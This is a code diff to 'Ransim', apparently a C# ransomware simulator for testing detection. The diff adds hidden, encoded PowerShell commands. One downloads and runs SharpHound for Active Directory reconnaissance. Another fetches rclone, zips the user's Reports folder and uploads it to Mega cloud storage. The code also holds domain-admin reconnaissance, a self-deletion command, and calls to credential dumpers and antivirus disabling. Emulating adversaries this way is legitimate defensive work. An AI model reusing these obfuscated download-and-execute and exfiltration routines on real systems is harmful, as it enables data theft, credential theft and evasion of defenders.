@@ -221,10 +221,16 @@ namespace Ransim
             // AD Domain recon
             Process.Start("nltest.exe", "/domain_trusts");
             Process.Start("nltest.exe", "/domain_trusts /all_trusts");
-            Process.Start("net.exe", "group 'Domain Admins' /domain");
-
-            
+            Process.Start("net.exe", "group 'Domain Admins' /domain");   
         }
+
+        static void ExecuteSharpHound()
+        {
+            /* Runs Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/SharpHound.exe -Out $env:temp\sharphound.exe; Start-Process $env:temp\sharphound.exe -ArgumentList "--collectionmethods DConly --outputdirectory $env:temp" -NoNewWindow */
+            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBTAGgAYQByAHAASABvAHUAbgBkAC4AZQB4AGUAIAAtAE8AdQB0ACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAGgAYQByAHAAaABvAHUAbgBkAC4AZQB4AGUAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAdABlAG0AcABcAHMAaABhAHIAcABoAG8AdQBuAGQALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0ALQBjAG8AbABsAGUAYwB0AGkAbwBuAG0AZQB0AGgAbwBkAHMAIABEAEMAbwBuAGwAeQAgAC0ALQBvAHUAdABwAHUAdABkAGkAcgBlAGMAdABvAHIAeQAgACQAZQBuAHYAOgB0AGUAbQBwACIAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8AdwA=");
+
+        }
+
         static void RansomNoteDownload(string ransomNote)
         {
             WebClient client = new WebClient();
@@ -259,6 +265,15 @@ namespace Ransim
             Process.Start("cmd.exe", "/c ping 1.1.1.1 -n 5 > Nul & Del " + exePath + " /F /Q");
         }
 
+        static void ExfilData()
+        {
+            // Uses RClone to exfil data to Mega cloud storage
+            /* Runs $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/rclone.exe -Out $env:temp\rclone.exe; Invoke-WebRequest -URI https://raw.githubusercontent.com/d4rk-d4nph3/Ransim/v0.2/Tools/rclone.conf -Out $env:temp\rclone.conf; Compress-Archive -Path $env:userprofile\Reports -DestinationPath $env:temp\Exfil.zip -CompressionLevel Optimal; Start-Process "$env:temp\rclone.exe" -ArgumentList "--config $env:temp\rclone.conf --progress copy $env:temp\Exfil.zip mega:" -NoNewWindow; System.Threading.Thread.Sleep(5000); del $env:temp\Exfil.zip -Force */
+            // Change the delay value accordingly to leave enough time for the zip to be exfiltrated before deletion
+            // Default delay: 5 sec
+            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwByAGMAbABvAG4AZQAuAGUAeABlACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcgBjAGwAbwBuAGUALgBlAHgAZQA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwB2ADAALgAyAC8AVABvAG8AbABzAC8AcgBjAGwAbwBuAGUALgBjAG8AbgBmACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcgBjAGwAbwBuAGUALgBjAG8AbgBmADsAIABDAG8AbQBwAHIAZQBzAHMALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQBcAFIAZQBwAG8AcgB0AHMAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAAJABlAG4AdgA6AHQAZQBtAHAAXABFAHgAZgBpAGwALgB6AGkAcAAgAC0AQwBvAG0AcAByAGUAcwBzAGkAbwBuAEwAZQB2AGUAbAAgAE8AcAB0AGkAbQBhAGwAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAiACQAZQBuAHYAOgB0AGUAbQBwAFwAcgBjAGwAbwBuAGUALgBlAHgAZQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQAtAGMAbwBuAGYAaQBnACAAJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQBcAGQAZQBzAGsAdABvAHAAXAByAGMAbABvAG4AZQAuAGMAbwBuAGYAIAAtAC0AcAByAG8AZwByAGUAcwBzACAAYwBvAHAAeQAgACQAZQBuAHYAOgB0AGUAbQBwAFwARQB4AGYAaQBsAC4AegBpAHAAIABtAGUAZwBhADoAIgAgAC0ATgBvAE4AZQB3AFcAaQBuAGQAbwB3ADsAIABTAHkAcwB0AGUAbQAuAFQAaAByAGUAYQBkAGkAbgBnAC4AVABoAHIAZQBhAGQALgBTAGwAZQBlAHAAKAAzADAAMAAwACkAOwAgAGQAZQBsACAAJABlAG4AdgA6AHQAZQBtAHAAXABFAHgAZgBpAGwALgB6AGkAcAAgAC0ARgBvAHIAYwBlAA0ACgA=");
+        }
+
         static void Main(string[] args)
         {
             const string targetDir = "Reports";
@@ -289,22 +304,29 @@ namespace Ransim
 
             //Run Location Check
             LocationCheck();
+
             RunRecon();
-            DisableFirewall();
-            RunADFind();
-            RunSeatbelt();
-            RunPowerView();
-            RunPsExec();
-            DisableAV();
-            RunLaZagne();
-            RunMimikatz();
-            SimulateCobaltStrike();
+            // RunADFind();
+            //RunSeatbelt();
+            //RunPsExec();
+            //DisableAV();
+            //RunLaZagne();
+            //RunMimikatz();
+            //ExecuteSharpHound();
+            //DisableFirewall();
+
+            //SimulateCobaltStrike();
+
+            // ExfilData();
 
             // Runs a barrage of Registry manipulations commands
-            ManipulateRegistry();
+            //ManipulateRegistry();
 
-            StopServices();
+            //StopServices();
 
+            //RunPowerView();
+
+            return;
             Console.WriteLine("Starting encryption process");
             // Iterate over files in the target directory for encryption.
             foreach (string file in files)
